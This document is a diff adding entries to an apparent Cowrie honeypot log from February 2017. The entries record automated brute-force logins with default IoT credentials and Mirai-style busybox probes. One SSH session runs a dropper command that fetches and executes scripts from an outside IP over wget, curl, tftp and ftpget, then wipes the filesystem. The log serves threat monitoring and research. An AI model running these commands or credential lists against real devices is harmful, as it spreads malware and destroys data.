@@ -3969,3 +3969,233 @@
 2017-02-27T16:31:00+0000 [CowrieTelnetTransport,8488,185.2.82.6] Warning: state changed and new state returned
 2017-02-27T16:31:00+0000 [CowrieTelnetTransport,8488,185.2.82.6] login attempt: 5606
 2017-02-27T16:31:00+0000 [CowrieTelnetTransport,8488,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:01+0000 [CowrieTelnetTransport,8488,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:01+0000 [CowrieTelnetTransport,8488,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:04+0000 [CowrieTelnetTransport,8478,167.61.225.21] Closing TTY Log: log/tty/20170227-163017-None-8478i.log after 47 seconds
+2017-02-27T16:31:04+0000 [CowrieTelnetTransport,8478,167.61.225.21] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-27T16:31:04+0000 [CowrieTelnetTransport,8478,167.61.225.21] Connection lost after 85 seconds
+2017-02-27T16:31:17+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 51.15.136.218:40278 (10.8.41.81:2222) [session: d1f04b81]
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] NEW KEYS
+2017-02-27T16:31:17+0000 [HoneyPotSSHTransport,2875,51.15.136.218] starting service 'ssh-userauth'
+2017-02-27T16:31:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] 'admin' trying auth 'password'
+2017-02-27T16:31:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] login attempt: 44
+2017-02-27T16:31:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] login return, expect: [admin/admin]
+2017-02-27T16:31:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] login attempt [admin/admin] succeeded
+2017-02-27T16:31:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] 'admin' authenticated with 'password'
+2017-02-27T16:31:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2875,51.15.136.218] starting service 'ssh-connection'
+2017-02-27T16:31:20+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] got channel 'session' request
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] channel open
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.88.105.150/bins.sh; curl -O http://194.88.105.150/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 194.88.105.150 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 194.88.105.150; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.88.105.150 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n"
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Opening TTY Log: log/tty/20170227-163120-d1f04b81-0e.log
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.88.105.150/bins.sh; curl -O http://194.88.105.150/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 194.88.105.150 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 194.88.105.150; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.88.105.150 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: cd /tmp
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: cd /var/run
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: cd /mnt
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: cd /root
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: cd /
+2017-02-27T16:31:20+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] Command found: wget http://194.88.105.150/bins.sh
+2017-02-27T16:31:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://194.88.105.150/bins.sh>
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Not storing duplicate content b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Downloaded URL (http://194.88.105.150/bins.sh) with SHA-256 b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9 to dl/b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: curl -O http://194.88.105.150/bins.sh
+2017-02-27T16:31:20+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://194.88.105.150/bins.sh>
+2017-02-27T16:31:20+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://194.88.105.150/bins.sh>
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Not storing duplicate content b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Downloaded URL (http://194.88.105.150/bins.sh) with SHA-256 b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9 to dl/b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bins.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: sh /bins.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: tftp 194.88.105.150 -c get tftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 194.88.105.150
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 194.88.105.150 ftp1.sh ftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://194.88.105.150/ftp1.sh) with SHA-256 3453fe8489acb26f37f52090070fcb015ad082da91ad4d2cfda1de01495b7763 to dl/3453fe8489acb26f37f52090070fcb015ad082da91ad4d2cfda1de01495b7763
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: rm -rf /bins.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev \ r \ n
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Not storing duplicate content b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9 to dl/b33fb6411d7dbbb5c79fe6ff3e5c8bc3f5f38b07630a84cf350184b03b026eb9
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170227-163120-d1f04b81-0e.log after 0 seconds
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-27T16:31:20+0000 [HTTPPageDownloader,client] sending close 0
+2017-02-27T16:31:20+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://194.88.105.150/bins.sh>
+2017-02-27T16:31:24+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:44254 (10.8.41.81:2223) [session: TT8489]
+2017-02-27T16:31:25+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:32910 (10.8.41.81:2223) [session: TT8490]
+2017-02-27T16:31:25+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:59083 (10.8.41.81:2223) [session: TT8491]
+2017-02-27T16:31:25+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:44526 (10.8.41.81:2223) [session: TT8492]
+2017-02-27T16:31:28+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt: 5607
+2017-02-27T16:31:28+0000 [CowrieTelnetTransport,8489,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:29+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt [root/anko] failed
+2017-02-27T16:31:29+0000 [CowrieTelnetTransport,8489,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:29+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt: 5608
+2017-02-27T16:31:29+0000 [CowrieTelnetTransport,8489,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:30+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt [enable/shell] failed
+2017-02-27T16:31:30+0000 [CowrieTelnetTransport,8489,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:30+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt: 5609
+2017-02-27T16:31:30+0000 [CowrieTelnetTransport,8489,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:31+0000 [CowrieTelnetTransport,8489,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:31+0000 [CowrieTelnetTransport,8489,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:31+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt: 5610
+2017-02-27T16:31:31+0000 [CowrieTelnetTransport,8492,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt [root/xc3511] failed
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8492,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt: 5611
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8491,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt [root/xc3511] failed
+2017-02-27T16:31:32+0000 [CowrieTelnetTransport,8491,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt: 5612
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8490,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt [root/pass] failed
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8490,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:33+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2875,51.15.136.218] remote close
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8488,185.2.82.6] Connection lost after 39 seconds
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt: 5613
+2017-02-27T16:31:33+0000 [CowrieTelnetTransport,8492,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:34+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt [enable/shell] failed
+2017-02-27T16:31:34+0000 [CowrieTelnetTransport,8492,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:34+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt: 5614
+2017-02-27T16:31:34+0000 [CowrieTelnetTransport,8491,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:35+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt [enable/shell] failed
+2017-02-27T16:31:35+0000 [CowrieTelnetTransport,8491,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:35+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt: 5615
+2017-02-27T16:31:35+0000 [CowrieTelnetTransport,8490,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt [enable/shell] failed
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8490,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:36+0000 [HoneyPotSSHTransport,2875,51.15.136.218] avatar admin logging out
+2017-02-27T16:31:36+0000 [HoneyPotSSHTransport,2875,51.15.136.218] connection lost
+2017-02-27T16:31:36+0000 [HoneyPotSSHTransport,2875,51.15.136.218] Connection lost after 18 seconds
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt: 5616
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8491,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8491,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:36+0000 [CowrieTelnetTransport,8491,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt: 5617
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8490,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8490,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8490,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt: 5618
+2017-02-27T16:31:37+0000 [CowrieTelnetTransport,8492,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:38+0000 [CowrieTelnetTransport,8492,185.2.82.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:38+0000 [CowrieTelnetTransport,8492,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:40+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.6:44407 (10.8.41.81:2223) [session: TT8493]
+2017-02-27T16:31:44+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.7:41796 (10.8.41.81:2223) [session: TT8494]
+2017-02-27T16:31:45+0000 [CowrieTelnetTransport,8493,185.2.82.6] login attempt: 5619
+2017-02-27T16:31:45+0000 [CowrieTelnetTransport,8493,185.2.82.6] login return, expect: [root/vizxv]
+2017-02-27T16:31:45+0000 [CowrieTelnetTransport,8493,185.2.82.6] login attempt [root/vizxv] succeeded
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Opening TTY Log: log/tty/20170227-163147-None-8493i.log
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Warning: state changed and new state returned
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: enable
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: enable 
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Reading txtcmd from "txtcmds/bin/enable"
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: shell
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command not found: shell
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: sh
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: sh 
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox ps; /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox ps
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: ps
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /proc/mounts
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /proc/mounts
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox ECCHI
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/sys'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /sys/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/proc'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /proc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /dev/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/dev/pts'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /dev/pts/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/run'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /run/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/dev/shm'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /dev/shm/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/run/lock'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /run/lock/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
